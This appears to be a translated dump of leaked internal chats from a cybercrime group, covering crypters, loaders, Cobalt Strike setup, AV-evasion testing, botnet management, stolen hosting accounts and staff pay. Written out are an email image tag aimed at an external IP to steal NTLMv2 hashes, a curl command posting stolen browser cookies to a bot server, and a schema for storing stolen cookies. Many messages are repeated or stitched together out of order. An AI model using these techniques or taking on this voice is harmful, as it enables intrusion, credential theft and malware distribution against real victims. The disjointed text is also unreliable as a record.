hors@ - the second team of hackers, hors also smooth type, if there suddenly there are some gaps in the first with the paiload - you can go to the second, they are all familiar, no big deal, I try to load all evenly.
bentley@ - collects crypts on the trick, loader, cobs, verashells and other things, if something is urgently needed, you can say that from me and he will do everything.
Buza@ team leader for coders, if you need some modifications/consultations you can go to him. He is also the head of OSINT intelligence at our company, you can use him to request a breakthrough of some information on some companies.
That's all, if you need more hackers or some other people to help

something fucked up with crypts again, the outlet complains that only hanypots are flying from their uploads. i'm sure they're uploading incorrectly for some reason. My reasoning is this. If you tap the file with hanypot - it will tap and sucker. Another question is how they give it away, if they spam by bit attaches - hanypots are inevitable... Asked for reports on crypts and stubs - everything works. Hough cleans up the sources. So I don't see a problem on our end. Tomorrow I will test everything on my virtual machines with my own hands and we will try to figure it out. But most likely they are either spamming incorrectly or cockerel bases...

Hello, little brother.
I fucked my brains out about the crypts, let's look for an alterantive for the dink (it behaves inadequately and takes too long to check it) and we'll watch the runtime tomorrow. According to all the reports we have all clear on static, and what is checked by hand for rantime - they say clear. Either they are bullshitting or the servers load incorrectly since the Honeypots are knocking and the live machines are not
They want to bring together all our spammers in one chat, I think that this is unnecessary... The first reason is that there are 5 spammers, 4 of them are mediators...

Give time for zeus.
Give Zeus some attention.
Hi

i don't read the news.
bean is working.
Everybody's working except for you.
There's a movement going on.
Get out there.
Let's go corps.
Hi
Did you talk to booza yourself?
He said he double-checked everything.
Okay. .
Hey. Yeah, right here.
What's up?


later
let's talk
In a week or so.

[16:15:34] <Stern> take a moment with Zeus
[16:15:45] *** Unverified conversation started
[16:15:49] <buza> hello
[16:15:51] <buza> you already did
[16:16:09] <buza> we rechecked everything yesterday today
[16:16:16] <buza> uk clean, scans presented
[16:16:25] <buza> trk not so clean, in the dynamics 7 AB
[16:16:44] <Stern> well 7 av is more or less
[16:16:46] <Stern> and bk is clean at all ?
[16:16:50] <buza> in general
[16:16:51] <buza> min

[16:17:28] <buza> crypto 0 detects
hi! ok
got it under control, took a pause to think it over
will you talk to the person
or talk to me?
let's work it out
Let's see what's changed in the meantime.
It'll all work out.
Yeah, I'll talk too.
And you talk to him.
Add him here.
please
Yeah. Yeah.
When the def shows up.
Add the man from balzac to group 6.
Let's get him an account.
Group 5, that is.
hi) no news?
Yeah, okay.
There's a problem in the bk.
I think it's the network.
It's not knocking.
It's probably on the routers.
Talk to the booze.
Help him solve it.
I got it)
Hi, yes we can solve it, I asked Zeus to give me the file dokach\hls himself, or better to send straight to the mail to check the whole chain by hand

[27.07.2021 19:01:56] <rozteka> https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook
Nobody tested it?



[27.07.2021 19:03:52] <rozteka> I have an idea, but don't know whom to ask yet
send an email with the text
///
    <img src="file://157.230.60.143/download.jpg">
///

As a result, the client accesses samba and sends
DOMAIN/USER:NetnetlmHASH
here's an idea
it needs to be given to someone
and test it quickly
ask around to see who's willing to do it
and check it out in a couple of days
ok we'll do it
Damn, we didn't say enough.
More questions.)
I have it, I'll send it to 5 addresses, 15 minutes.
,?
ne zabydyd' plz pro menya
i had a problem with crypto and everything else is fine.

Sure! I think in your other email, you specified that you will like the following datasets:

    IP to Geolocation
    IP to ASN
    IP to Company
    IP to Carrier Detection
    Privacy/VPN Detection
    IP WHOIS (RWHOIS + RIR)
    Hosted Domains

Which pretty much constitutes as all our datasets and we offer a great combined price of USD15k/month for monthly updates. Weekly will be USD18k/month and daily will be closer to USD20k/month. Note that for all 3 options, we offer the standard 2 months discount (so x10 instead of x12) if you pay a year up front e.g. USD150k/year for monthly updates.

Hope that made sense and let me know if pricing works for you! I can also get an official quote out for you if you like.

Cheers

87 of which are for payroll and three for consumables.

The amount is growing slowly, we have 3 new coders receive already, Gold (the question of how much to pay him?) And admins there a little bit of new who also already receive for the past 2 weeks.


And Hesh wrote and said he agreed with you to buy 100vps for his mailing list.
Listen, what are we doing about the carbon? ))))) It's bought, waiting to be delivered. My guys are fucked up, they say you oligarchs just gave up on the whole thing...
You also said you needed some processors, any information?
m by the way, hash has two dudes who buy some routine stuff, do we pay them? should we also include them in the mix? or are they freelancers?)
I don't know about the hash yet.
For expenses, talk to Revers.
his team who will pay the salary, we do the same, or he is ready to take it on himself?
Understood I will.
Godl how much do you give the salary?
Who's that?

Make a decrypt test plz

In the bteam group.

I had a situation that one of the coders raised his own salary from 2 to 2.5k, I said, but who raised it with who agreed? And he said the headhunter is constantly bombarded with newsletters from our company and he said that you`ve been tracking the rate for a long time, the offers that come from work))))
 I get email offers from our company 🙂
19:38
it's like
19:38
the headhunter writes and indicates the raid
19:38
got it)))
no one tells me anything as usual i find out everything myself))))
19:39
Yes it was so - once Stern said let's throw 70k, I thought once. Then I get an offer on my email.
And so on.
Three times it came.
We should change the accounts from which they are looking for people, we'll get caught sooner or later... I think there are plenty of snakes with such an approach to security...
The most talked about guys in our field, and there's a lot of leakage all the time, the infrastructure, the files... it turns out that even the xx tracks the shit out of us because they have been pouring from the same accounts for years

Any other questions?
Hey, it's okay. I did what you said I did, I texted Zeus. But he has not said anything about the bk yet, and so I communicate with him periodically. Plus I'm aware of when he has some other problems on the admin or other modules. With coders and testers in touch, now we are trying to fix the import. On vntz and antic in progress, the coders are trying to rebuild.

I created a gm@ account for zolotoy.

hi
Ask him to do the following as well.
The encrypted message received from professor@q3mcco35auwcstmt.onion is unreadable, as you are not currently communicating privately.
Sure! I think in your other email, you specified that you will like the following datasets:

    IP to Geolocation
    IP to ASN
    IP to Company
    IP to Carrier Detection
    Privacy/VPN Detection
    IP WHOIS (RWHOIS + RIR)
    Hosted Domains

Which pretty much constitutes as all our datasets and we offer a great combined price of USD15k/month for monthly updates. Weekly will be USD18k/month and daily will be closer to USD20k/month. Note that for all 3 options, we offer the standard 2 months discount (so x10 instead of x12) if you pay a year up front e.g. USD150k/year for monthly updates.

Hope that made sense and let me know if pricing works for you! I can also get an official quote out for you if you like.

Cheers
Ken

hello
I downloaded the report.
I have a working battery, can not change yet if it is already charged
for example from next month
and another thing: since we have a lot of those who are looking for now, maybe how to distribute the search (let some people look for fresh resumes that are updated daily, and others scour the old that were added six months ago)? because I found a great specialist and found it just inactive, those who dropped the resume and forgot and not updated. but you know the responses from those who are looking for fresh. what do you think?
Good afternoon, from August 1, 2020 hh.ru introduced the biggest change - it switched to a new model of working with resumes. Now opening one resume will cost 60 rubles. The official rates hh here https://hhcdn.ru/file/16899324.pdf I can give you access to 10 times cheaper:

everything is up and running, not so fast, but you can work, they say.
they say it's not so fast, but it's workable. the server side will help us to output the listing for IDS, now it only hash out the IDS, but tomorrow it will help us to get the data for Vnts right in the admin area after the start.

[Error: message encrypted and can't be decrypted.]
I've got a little challenge for you
here
Say .
yeah
♪ you'll get a knock from driver@ ♪
there's a problem with the dero.
What's the problem?
the real data is causing errors in the crash logs
and if you do a direct query manually, it passes.
There's something in the data.
 Hi.
I guess you have to do some kind of validation.
So the data you get doesn't match the expected data
[Error: message encrypted and cannot be decrypted.]
[Error: message encrypted and cannot be decrypted.]
[Error: message encrypted and cannot be decrypted.]
[Error: message encrypted and cannot be decrypted.]
Well, we'll have to see what kind of crash it was.
If you give me the log, I can tell you what to do.
hello
I can't get requests from the clients to the derot.
I don't quite understand how it is possible to debug everything.
In the logs now in crash.log is the following

I understand it's crashing somewhere on the input, I did info level but as I see there's not even data about the request that puts everything in.
[Error: message is encrypted and can't be decrypted.]
I do by hand when everything is ok, but by hand I make a request like /xxxxxx/TEST/60
I understand there are several stages of interaction with real clients, it seems to me somewhere in the first stages he gets something wrong.
now look at the source code
the driver will send you
[Error: message encrypted and cannot be decrypted]
[Error: message encrypted and can't be decrypted.]
I think he's expecting http data stream to have some values. and the input is empty
parse_method(<< C, Rest/bits >>, State, SoFar) ->
 case C of
  $\r -> error_terminate(400, State);
  $\s -> parse_uri(Rest, State, SoFar);
  _ -> parse_method(Rest, State, << SoFar/binary, C >>)
 end.
here is the code
parse_method works only when there is an input data stream ... it expects string translation ... but there is no data in fact
[Error: message is encrypted and can't be decrypted.]
I've decrypted everything. That's why it crashes.
maybe the client forgets to insert the line break at the end?
Is there any way to find out what he sends as input?
It turns out not valid http data?
i think so.
To know - probably only by modifying cowboy. This is a liba-server to work with http
Strange that the entire log is full of it.
Maybe there's something else wrong with it, but I can't look any further with these crashes until I figure it out.
I sent it to the wrong place, sorry.
the crash log will always be clogged with something. there are a lot of requests. each one gets something in the log.
Usually when everything is fine there's almost nothing there, but when there's a problem.
I have it filled in 5 minutes like this.
Def it as a signal that something unforeseen happens.
Uses
Usually errors on the warning, error level drop and everything is clear.
We check the http request itself, the one who is responsible for it says that he has an idea what to look at, thanks for the tip, myself I would have broken my head here for what it may be.
) are you sure you have a problem...
is there something going on here?
i got kicked out of the mailing list (i suspect a bummer). and i do not know all the data that were specified when registering, because i bought the mail. all that i have worked, now i can not recover ((
now with the new will again duplicate everything. probably with gmail, it seems they do not block
Well, it's certainly not up to me )
Ask def, maybe he'll tell you.

I have a question. Do you know what it is? ejabberd can be made to work through socks5 ... so it makes connections to servers through a proxy?
you have a way to make the jabberd work in onion?
[Error: message encrypted and cannot be decrypted.]
yeah
you set up a torrc
prescribing the redirect port, which will receive to the onion domain and direct to the localhost
 how do you make outgoing connections ? for example how can I connect to a different onion-server ?
this is already more complicated, you probably need to send all traffic exiting to tor soks
i did not make a connection between servers, no need
but in general it is realistic ?
I think so

on vnts, put in the pink start and get data to connect vnts new
on Mon, let's start identification by the IDi in the Vnts list
on the dpost we do data transfer with ssl, before it worked without
we've come up with a way to generate new certificates on the main pads on the trike every hour
which will give a better bounce
and a constant rotation of rotary pads
we'll have it all up and running in Mon, we're in the process of doing it now
and this will be extended to bk and cobalt
+ there will be a constant change of parameters, it will be more difficult to track by certificates and fingerprints
and other software

Hi
I've been seeing some new features popping up, and I'm getting worried. There's a story here that I was planning on taking a vacation.
I want to have time to rest, summer is coming to an end, I'm a year without rest.
In this regard, I would like to ask you not to fill the next 3-4 weeks with new challenges to the functionality. I will try today, tomorrow at most on the check AB finish, I have the data, but with regulars need to finish.

I will make an unloading on the tax, and fix the logpost, finish the cookies with Nicholas and pass the system for support, I do not know exactly who, but we are discussing.
I'll be back from vacation and we'll quietly continue to develop the system. Right now I see that the priority bugs to quietly work 3 tascas (1 from you and 2 from Robin).
I will be back from vacation and ready to continue to develop the system and the chips in it already.
Do you think there is a way to limit the requests for new features for now?
Hi ok
what else have you added ?
[Error: message encrypted and can not be decrypted.]
I wrote, the Created field with the ability to sort is now there , You can make the newest bots.
And check Group IPs gives us 1 ip 1 bot, the most recent, it turns out that gives the offline bot, but you can filter by status and everything is ok then.
Box and check box in botlist section, field Check AV I finish, probably will need some filter to be able to get only bots with no AV in botlist?
Or the field is enough, and the filter is not needed?
I think so far only a field to see what AVs are on the bot
Ok, I do not think that more than 2 who puts, put in this box the name (I) AV just yet.

Now with the bench access issue is solving, I will give him the account.
This is another point, what rights to give testers at the booth in the admin panel?

hello!


I do not want to snitch or something like that, but we have this stuff everywhere and in everything, I am just wildly stressed, I try to move them all, but for all the shit to keep track of.
And it comes to the absurd, like ordering a server and waiting a week, then I write to everyone why they did not issue, the answers are dumbest, like I was thrown by the seller. Or here, Love for example had to buy an account - I have no PAP accounts, and I can not buy them anywhere.
How much do I pay for it, bro? - 70 bucks. I say, well, what are you like an idiot, could not make a week, and from the WTC to refill the account and pay - I have no WTC.
You're the one they complain about.
you're so stupid with the payments, what you do in 2 hours, it takes you a week to do it

Hi. How's it going?
What are your results?
What challenges are you facing?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other people will create their own coins, exchanges and projects on our system.

It's not about them being brainiacs and will\not pay, it's about our attitude towards the adversaries. Since we are a top affiliate, we have to comply.

And we have always one or the other. That we garbage in chats, then half a day do not answer the patient. Naturally ADVERS get nervous after that.

Hey, .
If you keep in touch, let me know.
Need some help?
Hi. I'll be in touch.
yeah
Talk to the driver tomorrow afternoon.
There's something in the dereo that needs to be sorted out.
crashes are coming
Maybe you can fix the software so it doesn't crash even if the data is invalid
so the only problem is that the log is shitting?
and suspicion that the database does not write
maybe write readable information in the log
what's wrong
the xttp protocol on the client side is wrong ...
I can't control it.
is it really the case
or change the libu that works with https
exactly
on the server side?
will it help?
not sure it will help. but maybe something else will.
At least it will be possible to intercept in the log. Then it will not shit
Let's do it.
I'm talking about "no guarantee of results"...
I need you to figure out the driver and the coder, help me with that.
tell me how much later
It's just that without you it's a dead phone
the module coder says that everything is fine, the driver does not see the data and sees crashes
and it's been going on for a long time.
Ok. I need to build a confab.

how do you debug such a complex system by feel?
Or make logs inside a lib
You'll need to do it live.
both flip and steller can show you the http requests they generate, and may try to fix them according to your instructions
Let me take a look at the binary stream ... I will do a log on a live server ...
You just need to tell me where the error is according to your version
maybe remove the lib? get the data from the socket?
they can give you a flow example too.
will you parse the https by yourself?
@zulas it's important to compare what they send with what you receive
i need to go out for an hour ... i'll come - i'll do it - i'll see
It's far from certain that it's the same.
What's the solution?
It's been like this many times.
The solution is to figure it out.

Yeah, I can. I'll filter it out.

[22:12:21] <dgh> Sec.
[22:12:30] <dgh> Didn't you save it?
[22:12:38] <dgh> I did 8 hours of work.
[22:14:15] <defender> there pass
[22:14:19] <defender> I wrote you!
[22:14:27] <defender> let's not link to the clock
[22:14:33] <defender> otherwise I'll be tethered
[22:14:52] <defender> if you want to go on vacation, let's finish all the questions
[22:18:17] <dgh> I see that you're starting to push, and honestly I don't like it.
I sent you the file and the password to it. that is, what depends on me I did. moreover, about the vacation I wrote in advance, what is happening now is not only my fault, and what depends on me I do.
If you want to put pressure on me and think that it will make me work better, you're wrong.
[22:29:37] <dgh> https://file.io/aFft29MLJJvM
sffsgpcXGH!@$
[22:30:57] <dgh> Accepted?
If you intend not to let me go on vacation if something isn't finished, and I suspect it might be, you'd better create a booze confab right away and let's discuss this point
I'll buy the tickets and I won't redo anything if something goes wrong.
[22:32:26] <dgh> And in the end I'll just go no matter what happens, I want it too much. I don't want unnecessary problems. But I'm not ready to go on some unclear conditions either.
There's a list of tasks I'm ready to do and I'm doing it, we've agreed on it.
[22:33:13] <dgh> Everything from above is not just my responsibility.
It's at least yours, booza's, and nikolos'.
[22:33:24] <dgh> I take my part and what I can do.
[22:34:50] <dgh> more than I can do anyway, if in this tone of talk will continue - it does not suit me.
Again, you want to push me like that, let's have a discussion. And either look for someone else like you wanted or let's negotiate. I'm tired a lot and I'm also sick and tired of nothing working.

you've got this binary query coming in.
If so, it should put a new record in the database
I mean it doesn't go to the database
There's nothing else there ...
just nothing is written in the logs.
And you say that the first of them parses and works fine
neither the first nor the second?
yes

No, I can't.

Hello. Is everything working?

here you have this binary request

No, I can't.

Hey! Bro, we need to organize the process for the purchase and configuration of cobs, let's find a couple more admins, teach them to set / buy cobs, and different variations, as I understand everyone puts differently and only you know how to do for all options) Without you there was some kind of crap with these cobs, and we really need them
Tell me what you need from me, we'll do it.
I'll give you a bonus to your paycheck.

[09:52:45] <mango> let him explain them what they need and buy
you need to find a grin 2 admins to buy and set up a coba, you can look for someone with experience on the forums
or search and teach through xx
you don't need admins there, you just need someone with knowledge of linux and the ability to monitor traffic
and most importantly, could for example raise the web server and bind it to the domain, understand the settings in the hoster - Dns, etc., plus should understand the cloud providers azura amazon ocean, etc..
[Error: the message is encrypted and cannot be decrypted.]
There was a conversation like this, I want you to be aware of it.
*** 2021-08-27
[20:31:56] <defender> t where?
[20:32:02] <defender> need file
[20:32:07] <defender> you sent me
[20:32:13] <defender> urgently
[22:12:21] <dgh> Sec.
[22:12:30] <dgh> Didn't you save it?
[22:12:38] <dgh> I did 8 hours of work.
[22:14:15] <defender> there pass
[22:14:19] <defender> I wrote you!
[22:14:27] <defender> let's not link to the clock
[22:14:33] <defender> otherwise I'll be tethered
[22:14:52] <defender> if you want to go on vacation, let's finish all the questions
[22:18:17] <dgh> I see that you're starting to push, and honestly I don't like it.
I sent you the file and the password to it. that is, what depends on me I did. moreover, about the vacation I wrote in advance, what is happening now is not only my fault, and what depends on me I do.
If you want to put pressure on me and think that it will make me work better, you're wrong.
[22:29:37] <dgh> https://file.io/aFft29MLJJvM
sffsgpcXGH!@$
[22:30:57] <dgh> Accepted?
If you intend not to let me go on vacation if something isn't finished, and I suspect it might be, you'd better create a booze confab right away and let's discuss this point
I'll buy the tickets and I won't redo anything if something goes wrong.
[22:32:26] <dgh> And in the end I'll just go no matter what happens, I want it too much. I don't want unnecessary problems. But I'm not ready to go on some unclear conditions either.
There's a list of tasks I'm ready to do and I'm doing it, we've agreed on it.
[22:33:13] <dgh> Everything from above is not just my responsibility.
It's at least yours, booza's, and nikolos'.
[22:33:24] <dgh> I take my part and what I can do.
[22:34:50] <dgh> more than I can do anyway, if in this tone of talk will continue - it does not suit me.
Again, you want to push me like that, let's have a discussion. And either look for someone else like you wanted or let's negotiate. I'm very tired and I'm also sick and tired of nothing working.
Talk to the driver.
He's blowing it off.
He thinks I'm pushing him.
but the fact is there's a lot of work to be done.
He nods at everyone, but he's had at least six months to figure it out.
We should look for a replacement, but in the meantime let him finish what he's doing.
I think he fucked it up.

we have this issue tightly, I would like to understand why not you)
i don't know ...

I'm telling you, it's transmitting as is.
No, I can't.
I did it through jinx.

@defender - so the question is closed ?
"Set zulas tasks to log, solve crash problems with it, there shouldn't be any."
the driver didn't contact you ?
do we have you in the rocket?
I'm not in the rocket. I'm only here. I know about the crashes ... all in the confab ... I do not know what solution they came to ... something to wait

The whole story about this conf was with the message that we had to change the parsing lib to make the logs, which zulas told us about, but the DEF came up with just putting a proxy andjinx. So I honestly don't really understand, there are no more edits in the back yet.
But there is a problem that some of the data does not come and we need to understand why and then continue to think.
All history about this confrontation was with the message that we should change parsing libu to make logs and zulas informed us about it but DEF invented just to put proxy andjinx. So I honestly don't really understand, there are no more edits in the back yet.

crashes may actually happen all the time ... like when a different protocol on the port connects ... then there may be a crash in the log . it does not mean that the service is down . it just means that one particular request did not cause the right reaction the server
crashes can always happen -- I mean when a random protocol on the port connects ... it might crash in the log . it doesn't mean the service is down . it just means that one particular request is not getting a proper server response

you need to find 2 grina admins to buy and configure a coba, you can look for someone with experience on the forums
or search for one and teach it through xx
you don't need super admins there, you just need to know linux and know how to monitor traffic
[09:52:35] <mango> buy 5 pcs.
[09:52:45] <mango> let him tell them what they need and buy it
and most importantly they should be able to e.g. setup a web server and bind it to a domain, understand hoster settings - dns, etc., plus they should understand cloud providers azura amazon ocean, etc.

Hi
defender@q3mcco35auwcstmt.onion/Psi+ invites you to the room ttrr@conference.q3mcco35auwcstmt.onion

elon@q3mcco35auwcstmt.onion: Greetings. Finished testing the spambot. Ready to release the assembly as a dll. We only need two things:
1) need to know for which bot dll, ie, what entry point to make there (with what to run it will be)
2) Need a server, the previous one is not paid (or I do not see the wrong version), so you need to order it again, we can order and deploy, but we need confirmation.
It is almost the same for the exe. But for the dll - you need to know to correctly make the entry points in the dll

And what kind of errors can the sump return? It's desirable to handle them somehow.
I added 403 to this request. On the module came 404 and 500. I guess 500 is from the gasket.

2. Create a table to store data (SQL pseudocode):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. provide reception of data in the following format:
- plain text divided into lines.
The line separator can be either UNIX or DOS.
One line - one record.
The record's field separator is a vertical slash.
Record format:

username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

Where

username - user name
browser - browser code (enum = chrome|ff|ie||edge)
domain - domain of cookie
cookie_name - cookie name
cookie_value - cookie value
created - creation date-time, Unix time
expires - expiry date-time, Unix time

Hi

elon@q3mcco35auwcstmt.onion: Greetings. Finished testing the spambot. Ready to release the assembly as a dll. We only need two things:
1) need to know for which bot dll, ie, what entry point to make there (with what to run it will be)
2) Need a server, the previous one is not paid (or I do not see the wrong version), so you need to order it again, we can order and deploy, but we need confirmation.
It is almost the same for the exe. But for dll - you need to know how to correctly make the entry points in the dll.
With what bot may be tested? Bk? Or a tribot?

hi, if you do, please email me - urgently please wait
no about the base64 ... added themselves obviously
Well, not for everyone obviously ) We have each part of the job, who does what - often unknown.
everything is just text
> We all do our own part of the job, it's often unclear who's in charge.  
I'm obviously not the only one who does this and it's not just on my end, otherwise it wouldn't work.
The code is 5 years old.
Well, it's not obvious either)
The fact is that errors are piled up. The documentation is not complete.
where have you been )
Zulas are you going to change the base for the new fields too?
If yes, then please don't do it, I'm doing migrations and I want all changes in database to be reflected in them.
I have written migrations for two fields secure and httponly
Both logical.
I won't do it .
And the 90 team added new fields
have you changed the base on the worker already ? can i dump ?
the fields will not be saved if there are more ?
dlls, programs, services I already added.
Oh, okay.
I haven't done it yet. I'll do it in a second.
I need a desktop shortcut field there but I haven't added it to the migration yet.
It's not in the back either.
Add it all at once so I don't have to come back.
Not yet. I will have time later this evening.
There need to add this field in other parts, so I will not be able to do it quickly.
I've set 2 fields in my cookies to migrate.
Here is the question. Why can it be that I make a request, back answers /1/ but in the info level logs no request, while in the database of the data I passed, too.
It is written in back that /1/ is always about the answer 200, but I noticed that he answers /1/ and if the bot is in the database and if it is not.

1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others already created their coins, exchanges and projects on our system.

Hi, only three ready, my mistake, I ordered everything from one host, there issuance almost immediately, but they eventually ran out of servers and now the account manager is waiting for him to issue a replacement, in a day

Ionita Laurentiu
Unfortunately, the server that you ordered is not available in our stock. An account manager will contact you during today with similar servers that we have available and it will be delivered to you immediately.

in order not to constantly go to the confab after the re-login at the top there is an asterisk, press twice and select auto-entry - always
then when the confab will not be relevant remove the asterisk
 > such a question is. Why can it be that I make a request, back to me answers /1/ but in the logs level info request is not, while in the database of the data that I sent, too, no.
It is written in back that /1/ is always about the answer 200, but I noticed that he answers /1/ and if the bot is in the database and if it is not.

first of all what is the request ? can we repeat it on the current system so I can see it ?

<mango> about Blake - we should point out that he's a fuckhead who somehow fixed the public open sorts cryptor under our control and started earning something on the side, even though he's developing just for us
[23:55:29] *** Your message was not sent. Either end your private conversation, or restart it.
[23:55:29] <mango> And to fuck with these cocksuckers - you can add that we'll give him this kopeck to support himself, so he won't starve to death, because he's unlikely to earn anything himself
A goodwill gesture for the stupid and penniless
Let the whole forum talk about it.
Such motherfuckers only have to design a calculator, that's all they're good for.
You can add that as a quote from the chief.
Bro, it's another misunderstanding with the hackers.
I'm asking how it's going
Yes, that's how it is.

Hi, what do you send the fullstocks TK? send me please.
Fields will not be saved if there are more of them?
dlls, programs, services I already added.
Oh, okay.
I haven't rolled it in yet, I'll do it in a sec.
I need a desktop shortcut field there but I haven't added it to the migration yet.
It's not in the back either.
Add it all at once so I don't have to come back.
Not yet. I will have time later this evening.
There need to add this field in other parts, so I will not be able to do it quickly.
I've set 2 fields in my cookies to migrate.
Here is the question. Why can it be that I make a request, back answers me /1/ but in the info level logs no request, while in the database of the data I passed, too, no.
It is written in back that /1/ is always about the answer 200, but I noticed that it answers /1/ both if the bot is in the database and if it is not.
good question, but zulas isn't on the board anymore
so do that question again when it comes up.
Ok, so there's no history here...
no
in order not to constantly go to the confab after the re-login at the top there is an asterisk, press twice and select auto-entry - always
then when the confab will not be relevant remove the asterisk

Hi
Rocket's lying around for now.
Make four proto2 vpc's.
Hi. Rocket is not working.
@driver let's be specific about what you need and where ... ok ?
You need to put 2 fields in 84 command.
Secure, httponly at the end of the reception, it turns out the 9th and 10th field should be.
At the request of the form
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
The answer should be /1/.
ok ... are the fields in the database now ?
Yes
and the old clients still work ?
i.e. have to support both the old format and the new one ?
No, just the new one should start working.

hi, tom asked for more data on bluehost.com, getting ready
On cpanel he worked it all out, there were a lot of duplicates, a lot, so I gave him everything
this is what he got accs 531 / domains 53
complains that there is no one to work out the grids, not enough hands
Hey, Bro.
Nothing has changed for the better in terms of work
Please give at least some kind of report
2-3-4-5 days
No shit.
added to the 5 chats
Even though I know that there are many more networks in my work ...
Everyone says we are busy
We're busy.
I feel like a beggar... give me information .... give me the information.
No one gives a fuck.
I will sell the nets that are not marked in any way that are in work or not in work.
5 I will not touch.
I'm not gonna touch the ones I have.
I will continue to work with you ... when we figure out how we can work transparently.
I don't doubt at all that there's no cheating on your part or that of your team...
...but there's definitely some fucked-up attitude on the part of the hackers.
I'm asking how you're doing... The network's down.
It's a 41kk grid.
You can't rebuild it out of the zapper...
Oh, I don't know.
Give me access
that's it.
the network is fuckin' great... no
fuck it!
someone else will give you more bots
It's not the quality, it's the quantity
I can't work that way, every bot is worth its weight in gold

[23:45:11] <mango> there were more than once moments that as soon as files are driven to farm for tests - even clean files started to stain immediately. eventually it turned out that with time test virtuals start marking files apparently somehow and they immediately fly away on defender, everywhere vatakat detect. solved only if test virtuals completely update

Hello, I work hard on the messenger design, now I will send the final result to the guys and we will move on to the next sections) the idea is interesting in my opinion - paid "likes". that is, in the news/articles section, people write posts, the post can comment on, or put a "Like". Like Like will be in the form of coins, and clicking on it will automatically deduct a dollar from your balance say) so the likes will be honest, and the person who wrote nice) such as an element of friendliness and adequacy in a world of internet freaks :D

 For the spam bot added functionality to send outlook address book data to the server and made it cross-bit. I gave the cross-bit version to the customer.  For the cryptor, I periodically clean it up and redid the method of encrypting the payload. Currently working on removing crt libraries from the crypter code.

Hi, if you're gonna be here let me know.
I have a lot of problems with the vntz injector and the antic.
I've got Veldon working on the antic, removing hanks and bugs, checking if the project will work.
The injector for vntz:
Problem with some sites not loading, or loading in the wrong form, related to the insertion of our code in html.
As a result a lot of ssl certificates and cache are created and some of them are updated and some are not.
The criteria of such behavior are unknown, which leads to difficulties in reconstructing a problematic situation on the test machine.
As a result, if chrome did not update the cache, our certificate does not fit it and some pieces are normally picked up and some are not, and a conflict occurs resulting in a page breakage.
This has to be checked with the config coder.
Today Jaime also built a build to fight privacy error, Robin will send me the addresses to check.
Otherwise, no big changes so far.
Well, there were also problems with detects on triples, but that has been overcome for the moment, today triple without them.

Hi) I'm back from vacation. Everyone there is working on their profiles, they are connected to the panel. In general cope, sometimes a lot of loads go through, may take longer to clean. I gave the stubs to Bentley, he did crypts through them for a while, said they worked well, now, I will add these stubs to the panel, will be on the type of their profiles for all loads. I'm going to make a slope on the profile under the trike, since they didn't notice that profile. This will reduce the load on the other profiles and speed up the issuance of crypt files

Hi) I am back from vacation. Everyone there is working on their profiles, they are connected to the panel. They generally manage, there are times a lot of loads go through, may take longer to clean. I gave the stubs to Bentley, he did crypts through them for a while, said they worked well, now, I will add these stubs to the panel, will be on the type of their profiles for all loads. I'm going to make a slope on the profile under the trike, since they didn't notice that profile. This will reduce the load on other profiles and speed up the issuance of crypt files

Hello
I'm in touch.
ready to work
I'm ready to work. Solana is written on rasta. I want to work on rasta, so I can use it to my advantage - to work on solana.
I don't want to be the only one to benefit from it... I can do it with a purpose.
> what's wrong with you?
did not understand the question
It doesn't work.

Congratulations! Now you can chat!

I'm here
hi
I did not put it
I'm done, so to speak.
Hi I got it fine
what cryptors would you single out?
Which one do you communicate with directly?
Hi. Okay.
Hi. Great.
I've contacted ford@ and viper@.
what's your schedule like when you're online ?
Is there a regular time?
So what's up with solana?
hold on
couple of minutes.
Hey. .
It's not that with Solana.
I thought I had some experience
rast by itself is good for writing loaaders and other malware)
it's not C++ and it's worse to analyze manually or automatically
why is it worse? ) well, the same as cm code
maybe analysis tools are not so well written ... well they will be
this is a known fact
I don't want to write a mumbo jumbo... )
rust go nim and even c#
a smallware on charp -- it's like going to space with basics ... it has a fat timing ... i don't need it
so where can i use your rast?
in writing a malware.
what's wrong with raster?
it's all bullshit.)
google is promoting it to linus, go ahead man, write a kernel on it
but you don't use it for any of your projects.)
Fucking saboteurs!
google has golang )
even worse golang
fuckin' hell
what's not?
i didn't even think ritchie would get that dirty.
c.
Oh, so you're a retired C-man.)
I'm a realist.
so what's the pooch then?
low mileage
the quality of the language itself isn't even important, just like for go
all the problems i had were with the unstable and immature ecosystem
it's not ready for sale despite all the cheeks puffing
and erlang ?
i don't know much about it after all these years
i think it's very effective
well ... high mileage ... but it's also a piece of shit as you understand it)
no he is not.
so why do not you have the task of writing something new?
the reason is simple
it is an exotic, for which there are no specialists on the market
they are simply not available
and for php it's nine seventy a kilo
the same is true for any exotic - recruiting people
here i am) and no tasks
to grow and to go
well ... go is not exotic compared to rast ... but i'm attracted to rast
it's probably because it's exotic
I'll get to grips with Haskel when I retire... that's where it's exotic - exotic
so what's new in erl? )
i'd rather give you the task of training people in erl
here you go
i'll say it again about the exotic.
i'm recruiting all the time, i'm confronted with the laws of the market
and i've been in it a long time, a very long time
there's a developer's desire for new and interesting things
and there are laws of evolution
according to the laws of evolution, well-proven solutions are in demand, tested by time, from which all unnecessary things have fallen away
like the wheel or the kobol
new exotics come and go, just like species
the one that proves itself, it stays on the market.
kobol is in demand - because there is a lot of legacy in the banks ) and bearded specks rule there ... i will be like that in 30 years .)
it's exactly the same with the erlang.
as it is with cobol.
